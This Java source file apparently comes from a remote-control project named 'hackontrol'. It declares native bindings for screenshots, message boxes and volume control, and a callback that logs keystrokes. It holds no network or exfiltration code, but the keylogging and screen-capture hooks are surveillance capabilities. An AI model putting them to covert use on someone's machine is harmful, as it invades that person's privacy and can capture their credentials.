package com.khopan.hackontrol.library;

import com.khopan.hackontrol.KeyboardHandler;

public class User {
	private User() {}

	public static native float getMasterVolume();
	public static native boolean isMute();
	public static native void setMasterVolume(float volume);
	public static native void setMute(boolean mute);
	public static native int showMessageBox(String title, String content, int flags);
	public static native byte[] screenshot();

	private static boolean log(int keyAction, int keyCode, int scanCode, int flags, int time, String keyName) {
		return KeyboardHandler.log(keyAction, keyCode, scanCode, flags, time, keyName);
	}
}
